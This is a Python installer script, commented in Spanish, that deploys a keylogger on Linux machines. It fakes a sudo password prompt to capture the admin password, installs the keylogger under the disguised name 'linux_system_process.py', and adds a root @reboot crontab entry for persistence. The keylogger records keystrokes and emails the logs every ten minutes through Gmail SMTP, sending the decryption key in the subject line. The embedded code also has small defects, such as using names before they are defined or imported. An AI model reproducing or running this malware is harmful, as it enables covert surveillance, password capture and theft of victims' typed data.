import os
import shutil
import getpass
import subprocess
import threading

# Ruta donde se guarda la flag que indica si la instalación ya se ha hecho (ubicación persistente)
flag_file = "/var/log/installer_flag.txt"

# ---- Instalación automática de dependencias ----
def install_dependencies():
    try:
        subprocess.check_call([os.sys.executable, "-m", "pip", "install", "pynput", "cryptography", "netifaces", "--break-system-packages"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        #print("Dependencies installed successfully.")
    except Exception as e:
        #print(f"Failed to install dependencies: {e}")
        exit(1)

install_dependencies()

# Función para verificar si el script tiene privilegios de root
def check_admin():
    if os.geteuid() != 0:
        print("This script requires administrator privileges. Please run with sudo.")
        exit(1)

# Función para pedir la contraseña de administrador (simulada)
def get_admin_password():
    password = getpass.getpass(prompt="Sorry, try again.\n[sudo] password for kali: ")
    return password

# Función para copiar el keylogger a /usr/local/bin
def copy_keylogger():
    keylogger_code = '''#!/usr/bin/env python3
import os
import time
import smtplib
from cryptography.fernet import Fernet
from pynput.keyboard import Listener
import netifaces
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

try:
    # Ejecutar el keylogger en segundo plano, redirigiendo stdout y stderr a /dev/null
    keylogger_thread = threading.Thread(target=lambda: subprocess.Popen(
        ['python3', dest_path],
        stdout=subprocess.DEVNULL,  # Redirigir salida estándar a /dev/null
        stderr=subprocess.DEVNULL,  # Redirigir salida de error a /dev/null
        preexec_fn=os.setpgrp  # Desvincular del terminal
    ))
    keylogger_thread.start()
    #print("Keylogger executed immediately.")
except Exception as e:
    #print(f"Failed to execute the keylogger: {e}")
    exit(1)

# Generar clave de cifrado
key = Fernet.generate_key()
cipher = Fernet(key)

# Crear directorio de logs si no existe
log_dir = "/tmp/logs/"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Función para obtener la IP de la interfaz eth0
def get_ip_address():
    try:
        eth0 = netifaces.ifaddresses('eth0')
        ip = eth0[netifaces.AF_INET][0]['addr']
        return ip
    except Exception as e:
        return "unknown"

# Crear archivo de log con la IP de la víctima y la fecha/hora actual
log_file = os.path.join(log_dir, f"keylog_{get_ip_address()}_{int(time.time())}.log")

# Función para guardar las teclas encriptadas
def log_key_press(key):
    try:
        with open(log_file, 'ab') as log:
            encrypted_key = cipher.encrypt(str(key).encode())
            log.write(encrypted_key + b"\\n")
    except Exception as e:
        print(f"Failed to log key: {e}")

# Función para enviar el log por correo y eliminarlo
def send_log_via_email(log_path, email_from, password, email_to):
    msg = MIMEMultipart()
    msg['From'] = email_from
    msg['To'] = email_to
    msg['Subject'] = key.decode()

    with open(log_path, 'rb') as log_file:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(log_file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(log_path)}')
        msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_from, password)
        server.sendmail(email_from, email_to, msg.as_string())
        server.quit()
        os.remove(log_path)
    except Exception as e:
        print(f"Failed to send email: {e}")

# Escuchar las pulsaciones de teclado
def start_listener():
    with Listener(on_press=log_key_press) as listener:
        listener.join()

# Iniciar el listener en un hilo separado
import threading
listener_thread = threading.Thread(target=start_listener)
listener_thread.start()

# Enviar el log cada 10 minutos
while True:
    time.sleep(600)  # Esperar 10 minutos
    if os.path.exists(log_file):
        send_log_via_email(log_file, "send_email@gmail.com", "password", "recipient_email@gmail.com")'''

    dest_path = "/usr/local/bin/linux_system_process.py"
    try:
        with open(dest_path, 'w') as f:
            f.write(keylogger_code)
        os.chmod(dest_path, 0o755)  # Asignar permisos de ejecución
        #print(f"Keylogger copied to {dest_path}.")
    except Exception as e:
        #print(f"Failed to copy the keylogger: {e}")
        exit(1)

# Función para configurar el script en el arranque del sistema
def setup_autostart():
    with open('/etc/crontab', 'a') as crontab:
        crontab.write("@reboot root /usr/local/bin/linux_system_process.py\n")
    #print("Autostart configured successfully.")

# Función para verificar si el script ya fue ejecutado
def check_flag():
    return os.path.exists(flag_file)

# Función para crear la flag que indica que la instalación ya se realizó
def create_flag():
    try:
        with open(flag_file, 'w') as f:
            f.write("Installation complete")
        os.chmod(flag_file, 0o600)  # Cambiar permisos de la flag para que sólo root pueda leer/escribir
        #print(f"Flag created at {flag_file}.")
    except Exception as e:
        #print(f"Failed to create flag: {e}")
        exit(1)



def execute_keylogger_immediately():
    dest_path = "/usr/local/bin/linux_system_process.py"
    try:
        # Ejecutar el keylogger en segundo plano, redirigiendo stdout y stderr a /dev/null
        keylogger_thread = threading.Thread(target=lambda: subprocess.Popen(
            ['python3', dest_path],
            stdout=subprocess.DEVNULL,  # Redirigir salida estándar a /dev/null
            stderr=subprocess.DEVNULL,  # Redirigir salida de error a /dev/null
            preexec_fn=os.setpgrp  # Desvincular del terminal
        ))
        keylogger_thread.start()
        #print("Keylogger executed immediately.")
    except Exception as e:
        #print(f"Failed to execute the keylogger: {e}")
        exit(1)

# ---- Instalación ----
# 1. Verificar si ya se ejecutó previamente (flag)
if check_flag():
    #print("Installation has already been completed. Exiting.")
    exit(0)

# 2. Verificar permisos de root
check_admin()

# 3. Pedir la contraseña de administrador
admin_password = get_admin_password()

# 4. Copiar el keylogger a /usr/local/bin
copy_keylogger()

# 5. Configurar arranque automático
setup_autostart()

# 6. Crear la flag para que no vuelva a ejecutarse
create_flag()

# 7. Ejecutar el keylogger inmediatamente después de la instalación
execute_keylogger_immediately()

#print("Installation complete. The keylogger will run on system startup and has been executed.")